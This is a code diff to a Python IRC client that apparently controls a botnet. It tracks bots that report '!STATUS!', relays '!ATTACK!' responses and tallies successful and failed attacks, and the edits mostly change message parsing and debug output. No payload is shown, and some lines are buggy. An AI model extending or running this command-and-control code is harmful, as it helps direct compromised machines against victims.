@@ -128,6 +128,8 @@ class conBot(threading.Thread):
         if not s:
             raise IRCBadMessage("Empty line.")
         if s[0] == ':':
+            print("line131")
+            print(s)
             prefix, s = s[1:].split(' ', 1)
         if s.find(' :') != -1:
             s, trailing = s.split(' :', 1)
@@ -174,7 +176,7 @@ class conBot(threading.Thread):
         if(test[0] == "!STATUS!"):
             if(name not in self.botList):
                 self.botList.append(name[0])
-                print(self.botList)
+                #print(self.botList)
         if(test[0] == "!ATTACK!"):
             print(test[1:])
             
@@ -192,30 +194,34 @@ class conBot(threading.Thread):
                 read_socks, write_socks, error_socks = select.select(socket_list,[],[])
                 for sock in read_socks:
                     if(sock == self.s):
-                        response = self.s.recv(1024).decode("utf-8")
-                        (prefix, command, args) = self.parsemsg(response)            
-                        print((prefix,command,args))
-                        if(command == '353'):
-                            print("line 170")
-                            #threading.Thread(target = prompt).start()
-                            self.isConnected = True
-                            #threading.Thread(target = prompt).start()                                
-                        elif command == "PRIVMSG":
-                            self.isConnected = True
-                            test = args[1].split() 
-                            print("prefix: " + prefix)
-                            if(test[0] in self.responses):
-                                self.handleResponse(prefix,test)
-                            #if(isconnected):
-                                #threading.Thread(target = prompt).start()
-                                #threading.Thread(target = prompt).start()
-                        elif command == "PING":
-                            self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))
-                            #if(isconnected):
-                            #    threading.Thread(target = prompt).start()                                        
-                        elif command == '433':
-                            self.createNick(NICK)
-                            self.connectIRC(self.s,self.NICK, self.chan)
+                        responses = self.s.recv(4096).decode("utf-8").split("\r\n")
+                        for response in responses:
+                            if(response != ""):
+                                (prefix, command, args) = self.parsemsg(response)            
+                                #print((prefix,command,args))
+                                print(response)
+                                if(command == '353'):
+                                    print("line 170")
+                                    #threading.Thread(target = prompt).start()
+                                    self.isConnected = True
+                                    #threading.Thread(target = prompt).start()                                
+                                elif command == "PRIVMSG":
+                                    self.isConnected = True
+                                    test = args[1].split()
+                                    print("pre") 
+                                    print("prefix: " + prefix)
+                                    if(test[0] in self.responses):
+                                        self.handleResponse(prefix,test)
+                                    #if(isconnected):
+                                        #threading.Thread(target = prompt).start()
+                                        #threading.Thread(target = prompt).start()
+                                elif command == "PING":
+                                    self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))
+                                    #if(isconnected):
+                                    #    threading.Thread(target = prompt).start()                                        
+                                elif command == '433':
+                                    self.createNick(NICK)
+                                    self.connectIRC(self.s,self.NICK, self.chan)
                          
                     elif (sock == sys.stdin):
                         self.command = sys.stdin.readline().split()
@@ -246,11 +252,12 @@ class conBot(threading.Thread):
             self.connection()
         
     def prompt(self):
-        self.isConnected = False   
-        time.sleep(5)
-        #print(self.command)
+        self.isConnected = False
+        time.sleep(5)        
         if(self.command[0] == "status"):
-            print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))
+            lock = threading.Lock()
+            with lock:
+                print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))
         
         elif self.command == "attack":
             for i in self.attackBotListSucc:
@@ -259,7 +266,7 @@ class conBot(threading.Thread):
                 print("{}: attack failed".format(i))
             print("Total: {} successful, {} unsuccessful".format(str(len(self.attackBotListSucc)),str(len(selt.attackBotListSucc))))
         print("Enter valid command: ")
-            
+                   
     
 def main():
         
